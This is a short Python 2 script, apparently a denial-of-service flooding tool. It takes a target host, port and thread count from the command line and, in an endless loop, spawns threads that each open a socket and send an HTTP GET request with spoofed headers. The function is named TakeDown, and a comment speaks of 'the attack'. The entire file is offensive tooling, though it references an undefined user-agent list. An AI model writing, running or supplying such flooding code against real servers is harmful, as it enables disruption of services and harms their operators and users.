import threading
import socket
import random
import sys

global headers,UsAg,host,port
   
 
def TakeDown(host="",port=80):
    try:
        try:
            sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        except socket.error,msg:
            print "Error:",msg
        else:
            try:
                host=socket.gethostbyname(host)
            except socket.gaierror:
                print "Could not resolve hostname."
                sys.exit()
            else:
                packet = str("GET / HTTP/1.1\nHost: "+host+"\n\n User-Agent: "+random.choice(UsAg)+"\n"+headers).encode('utf-8')
                if sock.connect_ex((host,port))==0:
                    if sock.sendall(packet)==None:
                        print "Packet sent successfuly!"
                        sock.close()
                    else:
                        print "Error while sending!"
                        sys.exit()
    except Exception as e:
        print e
        print socket.gethostname()
        
                        
if __name__=="__main__":
    host=sys.argv[1] #raw_input("Enter host address:")
    port=sys.argv[2] #raw_input("Enter port number:")
    threads=sys.argv[3] #raw_input("Enter number of threads:")
    threads=int(threads)
    port=int(port)
    headers = """ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-us,en;q=0.5
    User-Agent: Windows / IE 6: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)
    Accept-Encoding: gzip,deflate
    Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
    Keep-Alive: 115 """
    
    while True:
        for i in range(threads):
            th=threading.Thread(target=TakeDown,args=(host,port,),name="User-"+str(1))
            th.Daemon=True #thread dies if it exits!
            th.start()
            #th.join()#make the attack sequential
